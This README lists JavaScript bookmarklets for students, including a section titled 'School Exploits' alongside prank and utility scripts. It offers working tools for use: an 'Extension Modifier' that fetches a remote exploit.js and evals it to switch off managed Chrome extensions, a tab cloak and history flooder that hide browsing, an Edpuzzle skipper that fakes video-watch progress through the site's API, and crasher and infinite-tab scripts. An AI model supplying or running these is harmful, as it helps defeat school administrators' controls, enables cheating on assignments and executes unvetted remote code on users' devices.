# Bookmarklets


## Notice!
I Did Not Make All Of These, Most Of These I Have Found On Various Websites
That Probably Got Them From Somewhere Else
I'm Just Putting Them Here So Its Easier For People To Find Them And Use Them!


## School Exploits

### Extension Modifier
---
This Bookmarklet Allows The User To Turn On Or Off
Their Chrome Extensions.

```javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);```

This One Requires You To Open It Twice In The Same Tab!

### History Flooder
---
This Bookmarklet Allows The User To Flood Their
History With Whatever Tab They Are On.

```javascript:var num=prompt("History flood amount:");done=false;x=window.location.href;for (var i=1; i<=num; i++){history.pushState(0, 0, i==num?x:i.toString());if(i==num){done=true}}if(done===true){alert("History flood successful! "+window.location.href+" now appears in your history "+num+(num==1?" time.":" times."))}```

### Tab Disguise
---
This Bookmarklet Disguises The Tab You Are On To Look
Like Google Drive.

```javascript:function gcloak() { var link = document.querySelector("link[rel*='icon']") || document.createElement('link');link.type = 'image/x-icon';link.rel = 'shortcut icon';link.href = 'https://www.pngall.com/wp-content/uploads/9/Google-Drive-Logo-Transparent-180x180.png';document.title = 'My Drive - Google Drive';console.log(document.title);document.getElementsByTagName('head')[0].appendChild(link) };gcloak();setInterval(gcloak, 1000);```

### Edpuzzle Video Skipper
---
This Bookmarklet Allows You To Skip Edpuzzle
Videos

```javascript:(function() { function httpGet(url, callback, headers = [], method = "GET", content = null) { const request = new XMLHttpRequest(); request.addEventListener("load", callback); request.open(method, url, true); headers.forEach((header) => request.setRequestHeader(header[0], header[1])); request.send(content); } function getAssignment() { const assignmentId = window.location.pathname.split("/")[2]; const url = `https://edpuzzle.com/api/v4/assignments/${assignmentId}/play`; const headers = [ ["accept", "application/json, text/plain, */*"], ["accept_language", "en-US,en;q=0.9"], ["content-type", "application/json"], ["referer", window.location.href], ]; httpGet(url, function() { const data = JSON.parse(this.responseText); const attemptId = data.mediaAttempt._id; postAttempt(attemptId); }, headers); } function postAttempt(attemptId) { const url = `https://edpuzzle.com/api/v4/media_attempts/${attemptId}/watch`; const content = { "timeIntervalNumber": 10 }; const headers = [ ["accept", "application/json, text/plain, */*"], ["accept_language", "en-US,en;q=0.9"], ["content-type", "application/json"], ["referer", window.location.href], ]; httpGet(url, function() { window.location.reload(); }, headers, "POST", JSON.stringify(content)); } getAssignment(); })();```

## Fun Stuff

### AutoClicker
---
This Bookmarklet Makes Your Cursor Act As If It Was An AutoClicker
Only Works On That Tab That You Use The Bookmarklet On!

```javascript:(function(x,y){if(!window.click){window.click=!0,document.body.style.cursor='crosshair';var cps=prompt('Autoclicker CPS: (Under 200 recommended)');if(!cps||isNaN(cps)?(alert(%27You entered something wrong. Try running the script again.%27),end()):alert(%27Autoclicker activated at %27+cps+%27 CPS! Do [ctrl+e] to stop.%27),addEventListener(%27mousemove%27,e=>{x=e.clientX,y=e.clientY}),addEventListener(%27keydown%27,e=>{%27e%27===e.key&&e.ctrlKey&&(alert(%27Autoclicker deactivated! Click the bookmark again to reactivate!%27),end())}),window.click)var int=setInterval(function(){var e=document.elementFromPoint(x,y);e&&e.click()},1e3/cps);function end(){clearInterval(int),window.click=!1,document.body.style.cursor=%27default%27}}})();```

### Chromebook Crasher
---
This Bookmarklet Crashes The Chromebook!
Use At Your Own Risk!

```javascript:alert("Are You Sure?");alert("Use At Your Own Risk");alert("Ready? IF NO RELOAD NOW.");setTimeout(() => {while (true) {while(1)location.reload(1)}}, 1000);```

### High Pitch Sound Hider
---
Plays The High Pitch Noise, And You Can Hide The Window.

```javascript:alert("High Pitched Noise! Press H to Hide!");var s = "https://www.youtube.com/embed/MMNa8yqUEbE";((function(){var a,b,c;c=s,b=document.createElement("iframe"),b.setAttribute("src",c),b.setAttribute("id","rusic-modal"),b.setAttribute("style","position: fixed; z-index: 999999; width: 400px; height: 270px; left: 10px; top: 10px; border: 5px solid #009933; overflow: hidden; background-color: #fff;"),a=document.getElementsByTagName("body")[0],a.appendChild(b); window.addEventListener('keydown', function(event) { if (event.key == 'h') { b.setAttribute("style","left:-100000px;"); } }); })).call(this); ```

### Metal Pipe
---
Changes All Images To Metal Pipe And Plays The 
Falling Metal Pipe Sound Effect.

```javascript:(function(){var audio=new Audio('https://www.myinstants.com/media/sounds/jixaw-metal-pipe-falling-sound.mp3');audio.play();var imgs=document.getElementsByTagName('img');for(var i=0;i<imgs.length;i++){imgs[i].src='https://i.kym-cdn.com/entries/icons/original/000/043/027/metalpipefalling.jpg';}})();```

### Corrupt Series
---
A Few Different Bookmarklets That Make Your Chromebook
KindOf Look Like It Has A Virus, Or A Least The Website

Corrupt Text
```javascript:(function(){var s = document.createElement('style');s.innerHTML = 'body {background-color: black; color: green; font-family: Courier New; font-size: 200%; text-shadow: 2px 2px #FF0000;} * {background-color: black !important; color: green !important; font-family: Courier New !important; text-shadow: 2px 2px #FF0000 !important;}';document.body.appendChild(s);})();```

CorruptV2
```javascript:(function(){    var css = document.createElement("style");    css.type = "text/css";    css.innerHTML = "body { font-family: 'Comic Sans MS', 'Marker Felt', fantasy; color: #ff0000; }";    document.head.appendChild(css);    var message = document.createElement("div");    message.style.position = "fixed";    message.style.top = "0";    message.style.left = "0";    message.style.right = "0";    message.style.bottom = "0";    message.style.background = "black";    message.style.color = "white";    message.style.fontSize = "60px";    message.style.fontFamily = "Impact";    message.style.textAlign = "center";    message.style.paddingTop = "200px";    message.innerHTML = "Error: Page has been corrupted";    document.body.appendChild(message);    var images = document.getElementsByTagName("img");    for (var i = 0; i < images.length; i++) {        images[i].style.animation = "imageShift 2s infinite";        images[i].style.animationTimingFunction = "ease-in-out";    }    var elements = document.querySelectorAll("*");    for (var i = 0; i < elements.length; i++) {        if (elements[i].tagName != "IMG") {            elements[i].style.animation = "spinAndBounce 1s infinite";            elements[i].style.animationTimingFunction = "ease-in-out";        }    }    var keyframes = "\        @keyframes imageShift {\            0% { transform: translateX(0px); }\            50% { transform: translateX(20px); }\            100% { transform: translateX(0px); }\        }\        @keyframes spinAndBounce {\            0% { transform: rotate(0deg) scale(1); }\            50% { transform: rotate(180deg) scale(1.2); }\            100% { transform: rotate(360deg) scale(1); }\        }\    ";    var style = document.createElement("style");    style.type = "text/css";    style.innerHTML = keyframes;    document.head.appendChild(style);})();```

### Gravity
---
Makes The Website Simulate Gravity 

```javascript:(function(){ var elements = document.querySelectorAll("*"); var initialPositions = []; for (var i = 0; i < elements.length; i++) { var rect = elements[i].getBoundingClientRect(); initialPositions.push({ x: rect.x, y: rect.y }); } var gravity = 0.1; // adjust this value to change gravity strength function fall() { for (var i = 0; i < elements.length; i++) { var rect = elements[i].getBoundingClientRect(); elements[i].style.top = rect.y + gravity + "px"; } } var timer = setInterval(function() { fall(); var screenBottom = window.innerHeight; for (var i = 0; i < elements.length; i++) { var rect = elements[i].getBoundingClientRect(); if (rect.bottom >= screenBottom) { elements[i].style.top = initialPositions[i].y + "px"; } } }, 30); // adjust this value to change the animation speed })();```

### Fake Update
---
Creates A Fake Chrome Update Screen

```javascript:(function() { var overlay = document.createElement("div"); overlay.style.position = "fixed"; overlay.style.top = "0"; overlay.style.left = "0"; overlay.style.width = "100%"; overlay.style.height = "100%"; overlay.style.background = "#FFFFFF"; overlay.style.opacity = "0.95"; overlay.style.zIndex = "9999999"; var dialog = document.createElement("div"); dialog.style.position = "absolute"; dialog.style.top = "50%"; dialog.style.left = "50%"; dialog.style.transform = "translate(-50%, -50%)"; dialog.style.width = "450px"; dialog.style.padding = "20px"; dialog.style.background = "#FFFFFF"; dialog.style.border = "1px solid #333333"; dialog.style.borderRadius = "5px"; dialog.style.boxShadow = "0 0 10px rgba(0,0,0,0.5)"; dialog.style.zIndex = "99999999"; var title = document.createElement("h1"); title.innerHTML = "Google Chrome Update"; title.style.marginTop = "0"; title.style.textAlign = "center"; dialog.appendChild(title); var message = document.createElement("p"); message.innerHTML = "Your version of Google Chrome is outdated. Please click the button below to update now."; message.style.margin = "20px 0"; message.style.textAlign = "center"; dialog.appendChild(message); var button = document.createElement("button"); button.innerHTML = "Update Now"; button.style.background = "#0078D7"; button.style.border = "none"; button.style.color = "#FFFFFF"; button.style.padding = "10px 20px"; button.style.borderRadius = "5px"; button.style.cursor = "pointer"; button.addEventListener("click", function() { window.location.href = "https://google.com/chrome"; }); dialog.appendChild(button); overlay.appendChild(dialog); document.body.appendChild(overlay); })();```

### Fake Error
---
Creates A Fake Error With Some Very Suspicious Music

```javascript:(function(){ var errorMessages = [ "Error: Server not found", "Error: Connection lost", "Error: Page not found", "Error: Invalid input", "Error: System overload" ]; var randomError = errorMessages[Math.floor(Math.random() * errorMessages.length)]; alert(randomError); document.body.style.backgroundColor = "magenta"; document.body.style.color = "yellow"; var audio = new Audio('https://www.myinstants.com/media/sounds/untitled_hG6mBU5.mp3'); audio.play(); })();```

### Link Changer
---
Changes Links On Websites To Random Websites
I Only Have 3 So Far

```javascript:(function(){ var links = document.getElementsByTagName('a'); for (var i = 0; i < links.length; i++) { var websites = ['https://longdogechallenge.com/', 'https://puginarug.com/', 'https://onesquareminesweeper.com/']; var randomWebsite = websites[Math.floor(Math.random() * websites.length)]; links[i].href = randomWebsite; } })();```

### Infinite Tab Opener
---
Opens Infinite Google Tabs Until You Close Out.

```javascript: alert("Use at your own risk."); while (true){window.open("https://www.google.com")}```

## Other

### AdBlocker
---
This Blocks All Ads On The Site That You Use That Bookmarklet On.
Sometimes Removes Emmbeded Games.

```javascript:(function(){    /* Ad-B-Gone: Bookmarklet that removes obnoxious ads from pages */    var selectors = [    /* By ID: */    '#sidebar-wrap', '#advert', '#xrail', '#middle-article-advert-container',    '#sponsored-recommendations', '#around-the-web', '#sponsored-recommendations',    '#taboola-content', '#taboola-below-taboola-native-thumbnails', '#inarticle_wrapper_div',    '#rc-row-container', '#ads', '#at-share-dock', '#at4-share', '#at4-follow', '#right-ads-rail',    'div#ad-interstitial', 'div#advert-article', 'div#ac-lre-player-ph',    /* By Class: */    '.ad', '.avert', '.avert__wrapper', '.middle-banner-ad', '.advertisement',    '.GoogleActiveViewClass', '.advert', '.cns-ads-stage', '.teads-inread', '.ad-banner',    '.ad-anchored', '.js_shelf_ads', '.ad-slot', '.antenna', '.xrail-content',    '.advertisement__leaderboard', '.ad-leaderboard', '.trc_rbox_outer', '.ks-recommended',    '.article-da', 'div.sponsored-stories-component', 'div.addthis-smartlayers',    'div.article-adsponsor', 'div.signin-prompt', 'div.article-bumper', 'div.video-placeholder',    'div.top-ad-container', 'div.header-ad', 'div.ad-unit', 'div.demo-block', 'div.OUTBRAIN',    'div.ob-widget', 'div.nwsrm-wrapper', 'div.announcementBar', 'div.partner-resources-block',    'div.arrow-down', 'div.m-ad', 'div.story-interrupt', 'div.taboola-recommended',    'div.ad-cluster-container', 'div.ctx-sidebar', 'div.incognito-modal', '.OUTBRAIN', '.subscribe-button',    '.ads9', '.leaderboards', '.GoogleActiveViewElement', '.mpu-container', '.ad-300x600', '.tf-ad-block',    '.sidebar-ads-holder-top', '.ads-one', '.FullPageModal__scroller',    '.content-ads-holder', '.widget-area', '.social-buttons', '.ac-player-ph',    /* Other: */    'script', 'iframe', 'video', 'aside#sponsored-recommendations', 'aside[role="banner"]', 'aside',    'amp-ad', 'span[id^=ad_is_]', 'div[class*="indianapolis-optin"]', 'div[id^=google_ads_iframe]',    'div[data-google-query-id]', 'section[data-response]', 'ins.adsbygoogle', 'div[data-google-query-id]',    'div[data-test-id="fullPageSignupModal"]', 'div[data-test-id="giftWrap"]' ];    for(let i in selectors) {        let nodesList = document.querySelectorAll(selectors[i]);        for(let i = 0; i < nodesList.length; i++) {            let el = nodesList[i];            if(el && el.parentNode)                el.parentNode.removeChild(el);        }    }})();```

### Cookie Remover
---
Removes All Cookies From That Site.

```javascript:void((function(){var a,b,c,e,f;f=0;a=document.cookie.split("; ");for(e=0;e<a.length&&a[e];e++){f++;for(b="."+location.host;b;b=b.replace(/^(?:%5C.|[^%5C.]+)/,"")){for(c=location.pathname;c;c=c.replace(/.$/,"")){document.cookie=(a[e]+"; domain="+b+"; path="+c+"; expires="+new Date((new Date()).getTime()-1e11).toGMTString());}}}alert("Expired "+f+" cookies");})())```

### URL Compressor
---
Compresses Any URL

```javascript:void(open('http://tinyurl.com/create.php?url=%27+encodeURIComponent(location.href)))```





